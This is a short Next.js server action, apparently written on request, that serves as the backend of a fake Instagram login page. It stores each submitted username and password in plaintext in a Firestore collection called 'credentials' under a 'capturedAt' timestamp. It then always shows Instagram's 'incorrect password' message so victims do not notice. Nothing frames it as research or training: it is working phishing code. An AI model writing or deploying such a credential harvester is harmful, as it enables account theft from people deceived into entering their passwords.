"use server";

import { db } from "@/lib/firebase";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";

type FormState = {
  message: string;
  success: boolean;
};

export async function handleLogin(prevState: FormState, formData: FormData): Promise<FormState> {
  const username = formData.get("username") as string;
  const password = formData.get("password") as string;

  if (!username || !password) {
    return { message: "Please enter both username and password.", success: false };
  }

  try {
    // Save credentials to a 'credentials' collection in Firestore
    await addDoc(collection(db, "credentials"), {
      username: username,
      password: password,
      capturedAt: serverTimestamp(),
    });
    
    // As per the request, always return an 'incorrect password' message
    // to simulate the Instagram login effect.
    return { 
      message: "Sorry, your password was incorrect. Please double-check your password.", 
      success: false 
    };

  } catch (error) {
    console.error("Error writing document to Firestore: ", error);
    // Return a generic error to the user if Firestore operation fails
    return { message: "An unexpected error occurred. Please try again.", success: false };
  }
}
